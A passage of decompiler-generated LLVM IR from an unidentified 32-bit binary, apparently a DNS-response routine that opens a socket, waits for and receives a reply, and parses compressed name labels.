  %v2_804f479 = inttoptr i32 %v1_804f479 to i16*
  store i16 256, i16* %v2_804f479, align 2
  %v0_804f482 = load i32, i32* @ebx, align 4
  %v1_804f482 = add i32 %v0_804f482, 2
  %v2_804f482 = inttoptr i32 %v1_804f482 to i16*
  store i16 256, i16* %v2_804f482, align 2
  %v0_804f488 = load i32, i32* %ebp.global-to-local, align 4
  %v10_804f488 = icmp eq i32 %v0_804f488, -1
  br i1 %v10_804f488, label %dec_label_pc_804f49c.preheader, label %dec_label_pc_804f490

dec_label_pc_804f490.loopexit:                    ; preds = %dec_label_pc_804f5b5
  %v0_804f493.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804f490

dec_label_pc_804f490:                             ; preds = %dec_label_pc_804f490.loopexit, %dec_label_pc_804f3aa
  %v0_804f493 = phi i32 [ %v0_804f493.pre, %dec_label_pc_804f490.loopexit ], [ %v0_804f488, %dec_label_pc_804f3aa ]
  %v0_804f490 = load i32, i32* @esp, align 4
  %v2_804f493 = add i32 %v0_804f490, -16
  %v3_804f493 = inttoptr i32 %v2_804f493 to i32*
  store i32 %v0_804f493, i32* %v3_804f493, align 4
  %v1_804f494 = call i32 @function_80521e1(i32 1)
  store i32 %v1_804f494, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f49c.preheader

dec_label_pc_804f49c.preheader:                   ; preds = %dec_label_pc_804f490, %dec_label_pc_804f3aa
  br label %dec_label_pc_804f49c

dec_label_pc_804f49c:                             ; preds = %dec_label_pc_804f49c.preheader, %dec_label_pc_804f5b5
  %v0_804f49c = load i32, i32* @ebx, align 4
  %v1_804f49c = load i32, i32* @esp, align 4
  %v2_804f49c = add i32 %v1_804f49c, -4
  %v3_804f49c = inttoptr i32 %v2_804f49c to i32*
  store i32 %v0_804f49c, i32* %v3_804f49c, align 4
  %v1_804f49d = add i32 %v1_804f49c, -8
  %v2_804f49d = inttoptr i32 %v1_804f49d to i32*
  store i32 0, i32* %v2_804f49d, align 4
  %v1_804f49f = add i32 %v1_804f49c, -12
  %v2_804f49f = inttoptr i32 %v1_804f49f to i32*
  store i32 2, i32* %v2_804f49f, align 4
  %v1_804f4a1 = add i32 %v1_804f49c, -16
  %v2_804f4a1 = inttoptr i32 %v1_804f4a1 to i32*
  store i32 2, i32* %v2_804f4a1, align 4
  %v3_804f4a3 = call i32 @function_80529d5(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804f4a3, i32* %eax.global-to-local, align 4
  %v0_804f4a8 = load i32, i32* @esp, align 4
  store i32 %v3_804f4a3, i32* @ebp, align 4
  %v10_804f4ad = icmp eq i32 %v3_804f4a3, -1
  br i1 %v10_804f4ad, label %dec_label_pc_804f5d0, label %dec_label_pc_804f4b6

dec_label_pc_804f4b6:                             ; preds = %dec_label_pc_804f49c
  %v0_804f4b6 = load i32, i32* @ecx, align 4
  %v2_804f4b6 = add i32 %v0_804f4a8, 12
  %v3_804f4b6 = inttoptr i32 %v2_804f4b6 to i32*
  store i32 %v0_804f4b6, i32* %v3_804f4b6, align 4
  %v1_804f4b7 = add i32 %v0_804f4a8, 8
  %v2_804f4b7 = inttoptr i32 %v1_804f4b7 to i32*
  store i32 16, i32* %v2_804f4b7, align 4
  %v1_804f4b9 = add i32 %v0_804f4a8, 4272
  store i32 %v1_804f4b9, i32* @edi, align 4
  %v2_804f4c0 = add i32 %v0_804f4a8, 4
  %v3_804f4c0 = inttoptr i32 %v2_804f4c0 to i32*
  store i32 %v1_804f4b9, i32* %v3_804f4c0, align 4
  %v3_804f4c1 = inttoptr i32 %v0_804f4a8 to i32*
  store i32 %v3_804f4a3, i32* %v3_804f4c1, align 4
  %v3_804f4c2 = call i32 @function_80527fa(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804f4c7 = load i32, i32* @esp, align 4
  %v1_804f4ca = add i32 %v3_804f4c2, 1
  %v8_804f4ca = icmp eq i32 %v1_804f4ca, 0
  store i32 %v1_804f4ca, i32* %eax.global-to-local, align 4
  br i1 %v8_804f4ca, label %dec_label_pc_804f5d0, label %dec_label_pc_804f4d1

dec_label_pc_804f4d1:                             ; preds = %dec_label_pc_804f4b6
  %v1_804f4d1 = add i32 %v0_804f4c7, 12
  %v2_804f4d1 = inttoptr i32 %v1_804f4d1 to i32*
  store i32 16384, i32* %v2_804f4d1, align 4
  %v1_804f4d6 = add i32 %v0_804f4c7, 20
  %v2_804f4d6 = inttoptr i32 %v1_804f4d6 to i32*
  %v3_804f4d6 = load i32, i32* %v2_804f4d6, align 4
  store i32 %v3_804f4d6, i32* %edx.global-to-local, align 4
  %v2_804f4da = add i32 %v0_804f4c7, 8
  %v3_804f4da = inttoptr i32 %v2_804f4da to i32*
  store i32 %v3_804f4d6, i32* %v3_804f4da, align 4
  %v1_804f4db = add i32 %v0_804f4c7, 2096
  store i32 %v1_804f4db, i32* %eax.global-to-local, align 4
  %v2_804f4e2 = add i32 %v0_804f4c7, 4
  %v3_804f4e2 = inttoptr i32 %v2_804f4e2 to i32*
  store i32 %v1_804f4db, i32* %v3_804f4e2, align 4
  %v0_804f4e3 = load i32, i32* @ebp, align 4
  %v3_804f4e3 = inttoptr i32 %v0_804f4c7 to i32*
  store i32 %v0_804f4e3, i32* %v3_804f4e3, align 4
  %v0_804f4e4 = call i32 @function_8052924()
  %v0_804f4e9 = load i32, i32* @esp, align 4
  %v1_804f4ec = add i32 %v0_804f4e4, 1
  %v8_804f4ec = icmp eq i32 %v1_804f4ec, 0
  store i32 %v1_804f4ec, i32* %eax.global-to-local, align 4
  br i1 %v8_804f4ec, label %dec_label_pc_804f5d0, label %dec_label_pc_804f4f3

dec_label_pc_804f4f3:                             ; preds = %dec_label_pc_804f4d1
  %v2_804f4f3 = add i32 %v0_804f4e9, 12
  %v3_804f4f3 = inttoptr i32 %v2_804f4f3 to i32*
  store i32 %v1_804f4ec, i32* %v3_804f4f3, align 4
  %v1_804f4f4 = add i32 %v0_804f4e9, 8
  %v2_804f4f4 = inttoptr i32 %v1_804f4f4 to i32*
  store i32 0, i32* %v2_804f4f4, align 4
  %v0_804f4f6 = load i32, i32* @ebp, align 4
  %v2_804f4f6 = add i32 %v0_804f4e9, 4
  %v3_804f4f6 = inttoptr i32 %v2_804f4f6 to i32*
  store i32 %v0_804f4f6, i32* %v3_804f4f6, align 4
  %v2_804f4f7 = inttoptr i32 %v0_804f4e9 to i32*
  store i32 3, i32* %v2_804f4f7, align 4
  %v3_804f4f9 = call i32 @function_805211d(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804f4fe = load i32, i32* @esp, align 4
  %v12_804f501 = or i32 %v3_804f4f9, 2048
  store i32 %v12_804f501, i32* %eax.global-to-local, align 4
  %v2_804f504 = add i32 %v0_804f4fe, 8
  %v3_804f504 = inttoptr i32 %v2_804f504 to i32*
  store i32 %v12_804f501, i32* %v3_804f504, align 4
  %v0_804f505 = load i32, i32* @ebp, align 4
  %v2_804f505 = add i32 %v0_804f4fe, 4
  %v3_804f505 = inttoptr i32 %v2_804f505 to i32*
  store i32 %v0_804f505, i32* %v3_804f505, align 4
  %v2_804f506 = inttoptr i32 %v0_804f4fe to i32*
  store i32 4, i32* %v2_804f506, align 4
  %v3_804f508 = call i32 @function_805211d(i32 1, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804f50d = load i32, i32* @esp, align 4
  %v1_804f50d = add i32 %v0_804f50d, 4144
  store i32 %v1_804f50d, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 32, i32* %ecx.global-to-local, align 4
  %v1_804f51b = inttoptr i32 %v1_804f50d to i8*
  store i32 %v1_804f50d, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804f51e = call i8* @_memset(i8* %v1_804f51b, i32 0, i32 32)
  %v6_804f51e = ptrtoint i8* %v5_804f51e to i32
  store i32 %v6_804f51e, i32* %ecx.global-to-local, align 4
  %v0_804f520 = load i32, i32* @ebp, align 4
  %v2_804f524 = udiv i32 %v0_804f520, 32
  store i32 %v2_804f524, i32* @esi, align 4
  %v1_804f527 = urem i32 %v0_804f520, 32
  store i32 %v1_804f527, i32* @ebx, align 4
  %v0_804f52a = load i32, i32* @esp, align 4
  %v2_804f52a = mul nuw nsw i32 %v2_804f524, 4
  %v3_804f52a = add nuw nsw i32 %v2_804f52a, 4144
  %v4_804f52a = add i32 %v3_804f52a, %v0_804f52a
  %v5_804f52a = inttoptr i32 %v4_804f52a to i32*
  %v6_804f52a = load i32, i32* %v5_804f52a, align 4
  %v9_804f52a = shl i32 1, %v1_804f527
  %v12_804f52a = or i32 %v6_804f52a, %v9_804f52a
  store i32 %v12_804f52a, i32* %v5_804f52a, align 4
  %v0_804f532 = load i32, i32* @esp, align 4
  %v1_804f532 = add i32 %v0_804f532, 4288
  %v2_804f532 = inttoptr i32 %v1_804f532 to i32*
  store i32 5, i32* %v2_804f532, align 4
  %v0_804f53d = load i32, i32* @esp, align 4
  %v1_804f53d = add i32 %v0_804f53d, 4292
  %v2_804f53d = inttoptr i32 %v1_804f53d to i32*
  store i32 0, i32* %v2_804f53d, align 4
  %v0_804f548 = load i32, i32* @esp, align 4
  %v1_804f548 = inttoptr i32 %v0_804f548 to i32*
  %v1_804f549 = add i32 %v0_804f548, 4288
  store i32 %v1_804f549, i32* %v1_804f548, align 4
  %v0_804f551 = load i32, i32* @ebp, align 4
  %v1_804f551 = add i32 %v0_804f551, 1
  store i32 %v1_804f551, i32* %eax.global-to-local, align 4
  %v1_804f554 = add i32 %v0_804f548, -4
  %v2_804f554 = inttoptr i32 %v1_804f554 to i32*
  store i32 0, i32* %v2_804f554, align 4
  %v1_804f556 = add i32 %v0_804f548, -8
  %v2_804f556 = inttoptr i32 %v1_804f556 to i32*
  store i32 0, i32* %v2_804f556, align 4
  %v0_804f558 = load i32, i32* %edx.global-to-local, align 4
  %v2_804f558 = add i32 %v0_804f548, -12
  %v3_804f558 = inttoptr i32 %v2_804f558 to i32*
  store i32 %v0_804f558, i32* %v3_804f558, align 4
  %v0_804f559 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f559 = add i32 %v0_804f548, -16
  %v3_804f559 = inttoptr i32 %v2_804f559 to i32*
  store i32 %v0_804f559, i32* %v3_804f559, align 4
  %v0_804f55a = call i32 @function_80523e8()
  store i32 %v0_804f55a, i32* %eax.global-to-local, align 4
  %v0_804f55f = load i32, i32* @esp, align 4
  %v1_804f55f = add i32 %v0_804f55f, 32
  %v10_804f562 = icmp eq i32 %v0_804f55a, -1
  br i1 %v10_804f562, label %dec_label_pc_804f5e4, label %dec_label_pc_804f567

dec_label_pc_804f567:                             ; preds = %dec_label_pc_804f4f3
  %v1_804f567 = icmp eq i32 %v0_804f55a, 0
  br i1 %v1_804f567, label %dec_label_pc_804f5ae, label %dec_label_pc_804f56b

dec_label_pc_804f56b:                             ; preds = %dec_label_pc_804f567
  %v1_804f56b = load i32, i32* @esi, align 4
  %v2_804f56b = mul i32 %v1_804f56b, 4
  %v3_804f56b = add i32 %v0_804f55f, 4160
  %v4_804f56b = add i32 %v3_804f56b, %v2_804f56b
  %v5_804f56b = inttoptr i32 %v4_804f56b to i32*
  %v6_804f56b = load i32, i32* %v5_804f56b, align 4
  %v7_804f56b = load i32, i32* @ebx, align 4
  %v8_804f56b = urem i32 %v7_804f56b, 32
  %v9_804f56b = shl i32 1, %v8_804f56b
  %v10_804f56b = and i32 %v9_804f56b, %v6_804f56b
  %v11_804f56b = icmp ne i32 %v10_804f56b, 0
  %v1_804f573 = zext i1 %v11_804f56b to i32
  %v3_804f573 = and i32 %v0_804f55a, -256
  %v4_804f573 = or i32 %v1_804f573, %v3_804f573
  store i32 %v4_804f573, i32* %eax.global-to-local, align 4
  %v4_804f576 = icmp eq i1 %v11_804f56b, false
  br i1 %v4_804f576, label %dec_label_pc_804f5e4, label %dec_label_pc_804f57a

dec_label_pc_804f57a:                             ; preds = %dec_label_pc_804f56b
  %v2_804f57a = add i32 %v0_804f55f, 28
  %v3_804f57a = inttoptr i32 %v2_804f57a to i32*
  store i32 %v4_804f573, i32* %v3_804f57a, align 4
  %v0_804f57b = load i32, i32* %eax.global-to-local, align 4
  %v2_804f57b = add i32 %v0_804f55f, 24
  %v3_804f57b = inttoptr i32 %v2_804f57b to i32*
  store i32 %v0_804f57b, i32* %v3_804f57b, align 4
  %v1_804f57c = add i32 %v0_804f55f, 20
  %v2_804f57c = inttoptr i32 %v1_804f57c to i32*
  store i32 0, i32* %v2_804f57c, align 4
  %v1_804f57e = add i32 %v0_804f55f, 16
  %v2_804f57e = inttoptr i32 %v1_804f57e to i32*
  store i32 0, i32* %v2_804f57e, align 4
  %v1_804f580 = add i32 %v0_804f55f, 12
  %v2_804f580 = inttoptr i32 %v1_804f580 to i32*
  store i32 16384, i32* %v2_804f580, align 4
  %v1_804f585 = add i32 %v0_804f55f, 8
  %v2_804f585 = inttoptr i32 %v1_804f585 to i32*
  store i32 2048, i32* %v2_804f585, align 4
  %v1_804f58a = add i32 %v0_804f55f, 64
  store i32 %v1_804f58a, i32* %eax.global-to-local, align 4
  %v2_804f58e = add i32 %v0_804f55f, 4
  %v3_804f58e = inttoptr i32 %v2_804f58e to i32*
  store i32 %v1_804f58a, i32* %v3_804f58e, align 4
  %v0_804f58f = load i32, i32* @ebp, align 4
  %v3_804f58f = inttoptr i32 %v0_804f55f to i32*
  store i32 %v0_804f58f, i32* %v3_804f58f, align 4
  %v0_804f590 = call i32 @function_80528e1()
  store i32 %v0_804f590, i32* %eax.global-to-local, align 4
  %v0_804f595 = load i32, i32* @esp, align 4
  store i32 %v0_804f590, i32* @ebx, align 4
  %v1_804f59a = add i32 %v0_804f595, 56
  %v2_804f59a = inttoptr i32 %v1_804f59a to i32*
  %v3_804f59a = load i32, i32* %v2_804f59a, align 4
  store i32 %v3_804f59a, i32* %eax.global-to-local, align 4
  %v2_804f59e = add i32 %v0_804f595, 16
  %v3_804f59e = inttoptr i32 %v2_804f59e to i32*
  store i32 %v3_804f59a, i32* %v3_804f59e, align 4
  %v2_804f59f = call i32 @function_8051c40(i8* inttoptr (i32 1 to i8*))
  %v1_804f5a4 = add i32 %v2_804f59f, 17
  store i32 %v1_804f5a4, i32* %eax.global-to-local, align 4
  %v0_804f5a7 = load i32, i32* @esp, align 4
  %v1_804f5a7 = add i32 %v0_804f5a7, 16
  %v0_804f5aa = load i32, i32* @ebx, align 4
  %v7_804f5aa = icmp ult i32 %v0_804f5aa, %v1_804f5a4
  %v1_804f5ac = icmp eq i1 %v7_804f5aa, false
  br i1 %v1_804f5ac, label %dec_label_pc_804f60a, label %dec_label_pc_804f5ae

dec_label_pc_804f5ae:                             ; preds = %dec_label_pc_804f636, %dec_label_pc_804f60a, %dec_label_pc_804f57a, %dec_label_pc_804f567
  %v0_804f5ae = phi i32 [ %v1_804f623, %dec_label_pc_804f636 ], [ %v1_804f623, %dec_label_pc_804f60a ], [ %v1_804f5a7, %dec_label_pc_804f57a ], [ %v1_804f55f, %dec_label_pc_804f567 ]
  %v1_804f5ae = add i32 %v0_804f5ae, 8
  %v2_804f5ae = inttoptr i32 %v1_804f5ae to i32*
  %v3_804f5ae = load i32, i32* %v2_804f5ae, align 4
  %v12_804f5ae = icmp eq i32 %v3_804f5ae, 5
  br i1 %v12_804f5ae, label %dec_label_pc_804f5e4, label %dec_label_pc_804f5b5

dec_label_pc_804f5b5:                             ; preds = %dec_label_pc_804f5d0, %dec_label_pc_804f5ae
  %v3_804f5b5 = phi i32 [ %v3_804f5dd, %dec_label_pc_804f5d0 ], [ %v3_804f5ae, %dec_label_pc_804f5ae ]
  %v1_804f5bd = phi i32 [ %v1_804f5da, %dec_label_pc_804f5d0 ], [ %v0_804f5ae, %dec_label_pc_804f5ae ]
  %v1_804f5b5 = add i32 %v1_804f5bd, 8
  %v2_804f5b5 = inttoptr i32 %v1_804f5b5 to i32*
  %v1_804f5b9 = add i32 %v3_804f5b5, 1
  store i32 %v1_804f5b9, i32* @edi, align 4
  %v0_804f5ba = load i32, i32* @ebp, align 4
  %v10_804f5ba = icmp eq i32 %v0_804f5ba, -1
  store i32 %v1_804f5b9, i32* %v2_804f5b5, align 4
  %v1_804f5c1 = icmp eq i1 %v10_804f5ba, false
  br i1 %v1_804f5c1, label %dec_label_pc_804f490.loopexit, label %dec_label_pc_804f49c

dec_label_pc_804f5d0:                             ; preds = %dec_label_pc_804f4d1, %dec_label_pc_804f4b6, %dec_label_pc_804f49c
  %v0_804f5d0.in = phi i32 [ %v0_804f4e9, %dec_label_pc_804f4d1 ], [ %v0_804f4c7, %dec_label_pc_804f4b6 ], [ %v0_804f4a8, %dec_label_pc_804f49c ]
  %v2_804f5d3 = inttoptr i32 %v0_804f5d0.in to i32*
  store i32 1, i32* %v2_804f5d3, align 4
  %v1_804f5d5 = call i32 @function_8053d90(i32 1)
  store i32 %v1_804f5d5, i32* %eax.global-to-local, align 4
  %v0_804f5da = load i32, i32* @esp, align 4
  %v1_804f5da = add i32 %v0_804f5da, 16
  %v1_804f5dd = add i32 %v0_804f5da, 24
  %v2_804f5dd = inttoptr i32 %v1_804f5dd to i32*
  %v3_804f5dd = load i32, i32* %v2_804f5dd, align 4
  %v12_804f5dd = icmp eq i32 %v3_804f5dd, 5
  %v1_804f5e2 = icmp eq i1 %v12_804f5dd, false
  br i1 %v1_804f5e2, label %dec_label_pc_804f5b5, label %dec_label_pc_804f5e4

dec_label_pc_804f5e4:                             ; preds = %dec_label_pc_804f5d0, %dec_label_pc_804f5ae, %dec_label_pc_804f56b, %dec_label_pc_804f4f3, %dec_label_pc_804f644, %dec_label_pc_804f64d.backedge
  %v0_804f5e4 = phi i32 [ %v0_804f652122, %dec_label_pc_804f644 ], [ %v0_804f652, %dec_label_pc_804f64d.backedge ], [ %v1_804f5da, %dec_label_pc_804f5d0 ], [ %v0_804f5ae, %dec_label_pc_804f5ae ], [ %v1_804f55f, %dec_label_pc_804f56b ], [ %v1_804f55f, %dec_label_pc_804f4f3 ]
  %v0_804f5e7 = load i32, i32* @ebp, align 4
  %v2_804f5e7 = add i32 %v0_804f5e4, -16
  %v3_804f5e7 = inttoptr i32 %v2_804f5e7 to i32*
  store i32 %v0_804f5e7, i32* %v3_804f5e7, align 4
  %v1_804f5e8 = call i32 @function_80521e1(i32 1)
  store i32 %v1_804f5e8, i32* %eax.global-to-local, align 4
  %v0_804f5ed = load i32, i32* @esp, align 4
  %v1_804f5ed = add i32 %v0_804f5ed, 16
  %v1_804f5f0 = inttoptr i32 %v1_804f5ed to i32*
  %v2_804f5f0 = load i32, i32* %v1_804f5f0, align 4
  store i32 %v2_804f5f0, i32* %edx.global-to-local, align 4
  %v1_804f5f3 = inttoptr i32 %v2_804f5f0 to i8*
  %v2_804f5f3 = load i8, i8* %v1_804f5f3, align 1
  %v3_804f5f3 = icmp eq i8 %v2_804f5f3, 0
  br i1 %v3_804f5f3, label %dec_label_pc_804f6f3, label %dec_label_pc_804f5fc

dec_label_pc_804f5fc:                             ; preds = %dec_label_pc_804f5e4
  %v2_804f5fc = load i32, i32* %v1_804f5f0, align 4
  store i32 %v2_804f5fc, i32* %eax.global-to-local, align 4
  %v1_804f5ff = add i32 %v0_804f5ed, 4300
  %v1_804f605 = inttoptr i32 %v1_804f5ff to i32*
  %v2_804f605 = load i32, i32* %v1_804f605, align 4
  store i32 %v2_804f605, i32* @ebx, align 4
  %v3_804f606 = add i32 %v0_804f5ed, 4308
  %v1_804f607 = inttoptr i32 %v3_804f606 to i32*
  %v2_804f607 = load i32, i32* %v1_804f607, align 4
  store i32 %v2_804f607, i32* @edi, align 4
  %v3_804f607 = add i32 %v0_804f5ed, 4312
  %v1_804f608 = inttoptr i32 %v3_804f607 to i32*
  %v2_804f608 = load i32, i32* %v1_804f608, align 4
  store i32 %v2_804f608, i32* @ebp, align 4
  ret i32 %v2_804f5fc

dec_label_pc_804f60a:                             ; preds = %dec_label_pc_804f57a
  %v1_804f60a = add i32 %v0_804f5a7, 60
  store i32 %v1_804f60a, i32* %edx.global-to-local, align 4
  %v2_804f60e = add i32 %v0_804f5a7, 40
  %v3_804f60e = inttoptr i32 %v2_804f60e to i32*
  store i32 %v1_804f60a, i32* %v3_804f60e, align 4
  %v0_804f612 = load i32, i32* @esp, align 4
  %v1_804f615 = add i32 %v0_804f612, 44
  store i32 %v1_804f615, i32* %ecx.global-to-local, align 4
  %v2_804f619 = add i32 %v0_804f612, -16
  %v3_804f619 = inttoptr i32 %v2_804f619 to i32*
  store i32 %v1_804f615, i32* %v3_804f619, align 4
  %v2_804f61a = call i32 @function_8051c40(i8* inttoptr (i32 1 to i8*))
  store i32 %v2_804f61a, i32* %eax.global-to-local, align 4
  %v0_804f61f = load i32, i32* @esp, align 4
  %v2_804f61f = add i32 %v2_804f61a, 65
  %v3_804f61f = add i32 %v2_804f61f, %v0_804f61f
  store i32 %v3_804f61f, i32* %ecx.global-to-local, align 4
  %v1_804f623 = add i32 %v0_804f61f, 16
  %v1_804f626 = add i32 %v0_804f61f, 30
  %v2_804f626 = inttoptr i32 %v1_804f626 to i16*
  %v3_804f626 = load i16, i16* %v2_804f626, align 2
  %v4_804f626 = zext i16 %v3_804f626 to i32
  %v7_804f626 = and i32 %v1_804f50d, -65536
  %v8_804f626 = or i32 %v4_804f626, %v7_804f626
  store i32 %v8_804f626, i32* @edi, align 4
  %v3_804f62b = add i32 %v0_804f61f, 48
  %v4_804f62b = inttoptr i32 %v3_804f62b to i16*
  %v5_804f62b = load i16, i16* %v4_804f62b, align 2
  %v16_804f62b = icmp eq i16 %v3_804f626, %v5_804f62b
  %v1_804f630 = icmp eq i1 %v16_804f62b, false
  br i1 %v1_804f630, label %dec_label_pc_804f5ae, label %dec_label_pc_804f636

dec_label_pc_804f636:                             ; preds = %dec_label_pc_804f60a
  %v1_804f636 = add i32 %v0_804f61f, 54
  %v2_804f636 = inttoptr i32 %v1_804f636 to i16*
  %v3_804f636 = load i16, i16* %v2_804f636, align 2
  %v4_804f636 = zext i16 %v3_804f636 to i32
  %v6_804f636 = and i32 %v2_804f61a, -65536
  %v7_804f636 = or i32 %v4_804f636, %v6_804f636
  store i32 %v7_804f636, i32* %eax.global-to-local, align 4
  %v4_804f63b = icmp eq i16 %v3_804f636, 0
  br i1 %v4_804f63b, label %dec_label_pc_804f5ae, label %dec_label_pc_804f644

dec_label_pc_804f644:                             ; preds = %dec_label_pc_804f636
  %v2_804f644 = call i16 @llvm.bswap.i16(i16 %v3_804f636)
  %v3_804f644 = zext i16 %v2_804f644 to i32
  %v6_804f644 = or i32 %v3_804f644, %v6_804f636
  store i32 %v6_804f644, i32* %eax.global-to-local, align 4
  %v3_804f648 = add i32 %v0_804f61f, 38
  %v4_804f648 = inttoptr i32 %v3_804f648 to i16*
  store i16 %v2_804f644, i16* %v4_804f648, align 2
  %v0_804f64d117 = load i32, i32* @esp, align 4
  %v1_804f64d118 = add i32 %v0_804f64d117, 22
  %v2_804f64d119 = inttoptr i32 %v1_804f64d118 to i16*
  %v3_804f64d120 = load i16, i16* %v2_804f64d119, align 2
  %v4_804f64d121 = add i16 %v3_804f64d120, -1
  store i16 %v4_804f64d121, i16* %v2_804f64d119, align 2
  %v0_804f652122 = load i32, i32* @esp, align 4
  %v1_804f652123 = add i32 %v0_804f652122, 22
  %v2_804f652124 = inttoptr i32 %v1_804f652123 to i16*
  %v3_804f652125 = load i16, i16* %v2_804f652124, align 2
  %v13_804f652126 = icmp eq i16 %v3_804f652125, -1
  br i1 %v13_804f652126, label %dec_label_pc_804f5e4, label %dec_label_pc_804f65a

dec_label_pc_804f65a:                             ; preds = %dec_label_pc_804f644, %dec_label_pc_804f64d.backedge
  %v0_804f652127 = phi i32 [ %v0_804f652, %dec_label_pc_804f64d.backedge ], [ %v0_804f652122, %dec_label_pc_804f644 ]
  %v0_804f65a = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_804f65a, i32* %edx.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_804f66311 = inttoptr i32 %v0_804f65a to i8*
  %v2_804f66312 = load i8, i8* %v1_804f66311, align 1
  %v3_804f66313 = zext i8 %v2_804f66312 to i32
  %v4_804f66314 = load i32, i32* %eax.global-to-local, align 4
  %v5_804f66315 = and i32 %v4_804f66314, -256
  %v6_804f66316 = or i32 %v5_804f66315, %v3_804f66313
  store i32 %v6_804f66316, i32* %eax.global-to-local, align 4
  %v4_804f66517 = icmp eq i8 %v2_804f66312, 0
  br i1 %v4_804f66517, label %dec_label_pc_804f69a, label %dec_label_pc_804f669.preheader.preheader

dec_label_pc_804f669.preheader.preheader:         ; preds = %dec_label_pc_804f65a
  %v1_804f68e = add i32 %v0_804f652127, 32
  br label %dec_label_pc_804f669.preheader

dec_label_pc_804f669.preheader:                   ; preds = %dec_label_pc_804f669.preheader.preheader, %dec_label_pc_804f72c
  %v0_804f730 = phi i32 [ %v3_804f730, %dec_label_pc_804f72c ], [ 1, %dec_label_pc_804f669.preheader.preheader ]
  %v0_804f72d43 = phi i32 [ %v0_804f72d, %dec_label_pc_804f72c ], [ 0, %dec_label_pc_804f669.preheader.preheader ]
  %v0_804f67639 = phi i32 [ %v1_804f72c, %dec_label_pc_804f72c ], [ %v0_804f65a, %dec_label_pc_804f669.preheader.preheader ]
  %v0_804f66937 = phi i32 [ %v6_804f663, %dec_label_pc_804f72c ], [ %v6_804f66316, %dec_label_pc_804f669.preheader.preheader ]
  br label %dec_label_pc_804f669

dec_label_pc_804f669:                             ; preds = %dec_label_pc_804f669.preheader, %dec_label_pc_804f671
  %v0_804f72d = phi i32 [ %v0_804f72d43, %dec_label_pc_804f669.preheader ], [ 1, %dec_label_pc_804f671 ]
  %v0_804f72c = phi i32 [ %v0_804f67639, %dec_label_pc_804f669.preheader ], [ %v2_804f692, %dec_label_pc_804f671 ]
  %v4_804f663 = phi i32 [ %v0_804f66937, %dec_label_pc_804f669.preheader ], [ %v6_804f694, %dec_label_pc_804f671 ]
  %v1_804f669 = trunc i32 %v4_804f663 to i8
  %tmp139 = icmp ult i8 %v1_804f669, -64
  br i1 %tmp139, label %dec_label_pc_804f72c, label %dec_label_pc_804f671

dec_label_pc_804f671:                             ; preds = %dec_label_pc_804f669
  %v1_804f671 = urem i32 %v4_804f663, 256
  store i32 %v1_804f671, i32* %eax.global-to-local, align 4
  %v1_804f676 = add i32 %v0_804f72c, 1
  %v2_804f676 = inttoptr i32 %v1_804f676 to i8*
  %v3_804f676 = load i8, i8* %v2_804f676, align 1
  %v4_804f676 = zext i8 %v3_804f676 to i32
  store i32 1, i32* @ebx, align 4
  %v2_804f684 = mul nuw nsw i32 %v1_804f671, 256
  %v2_804f687 = add nsw i32 %v2_804f684, -49152
  %v3_804f687 = or i32 %v4_804f676, %v2_804f687
  store i32 %v3_804f687, i32* %eax.global-to-local, align 4
  %v2_804f692 = add i32 %v1_804f68e, %v3_804f687
  store i32 %v2_804f692, i32* %edx.global-to-local, align 4
  %v1_804f694 = inttoptr i32 %v2_804f692 to i8*
  %v2_804f694 = load i8, i8* %v1_804f694, align 1
  %v3_804f694 = zext i8 %v2_804f694 to i32
  %v6_804f694 = or i32 %v3_804f694, %v2_804f687
  store i32 %v6_804f694, i32* %eax.global-to-local, align 4
  %v4_804f696 = icmp eq i8 %v2_804f694, 0
  %v1_804f698 = icmp eq i1 %v4_804f696, false
  br i1 %v1_804f698, label %dec_label_pc_804f669, label %dec_label_pc_804f69a

dec_label_pc_804f69a:                             ; preds = %dec_label_pc_804f72c, %dec_label_pc_804f671, %dec_label_pc_804f65a
  %v4_804f6b623 = phi i32 [ %v6_804f66316, %dec_label_pc_804f65a ], [ %v6_804f694, %dec_label_pc_804f671 ], [ %v6_804f663, %dec_label_pc_804f72c ]
  %v5_804f750 = phi i32 [ %v0_804f65a, %dec_label_pc_804f65a ], [ %v2_804f692, %dec_label_pc_804f671 ], [ %v1_804f72c, %dec_label_pc_804f72c ]
  %v1_804f69a = phi i32 [ 0, %dec_label_pc_804f65a ], [ 1, %dec_label_pc_804f671 ], [ %v0_804f72d, %dec_label_pc_804f72c ]
  %v0_804f69a = phi i32 [ 1, %dec_label_pc_804f65a ], [ %v0_804f730, %dec_label_pc_804f671 ], [ %v3_804f730, %dec_label_pc_804f72c ]
  %v2_804f69a = add i32 %v1_804f69a, %v0_804f65a
  %v2_804f69c = add i32 %v2_804f69a, %v0_804f69a
  store i32 %v2_804f69c, i32* @esi, align 4
  %v1_804f69f = inttoptr i32 %v2_804f69c to i16*
  %v2_804f69f = load i16, i16* %v1_804f69f, align 2
  %v8_804f69f = icmp eq i16 %v2_804f69f, 256
  %v1_804f6a4 = add i32 %v2_804f69c, 10
  store i32 %v1_804f6a4, i32* @edi, align 4
  br i1 %v8_804f69f, label %dec_label_pc_804f744, label %dec_label_pc_804f6ad

dec_label_pc_804f6ad:                             ; preds = %dec_label_pc_804f744, %dec_label_pc_804f69a
  store i32 %v1_804f6a4, i32* %edx.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_804f6b620 = inttoptr i32 %v1_804f6a4 to i8*
  %v2_804f6b621 = load i8, i8* %v1_804f6b620, align 1
  %v3_804f6b622 = zext i8 %v2_804f6b621 to i32
  %v5_804f6b624 = and i32 %v4_804f6b623, -256
  %v6_804f6b625 = or i32 %v3_804f6b622, %v5_804f6b624
  store i32 %v6_804f6b625, i32* %eax.global-to-local, align 4
  %v4_804f6b826 = icmp eq i8 %v2_804f6b621, 0
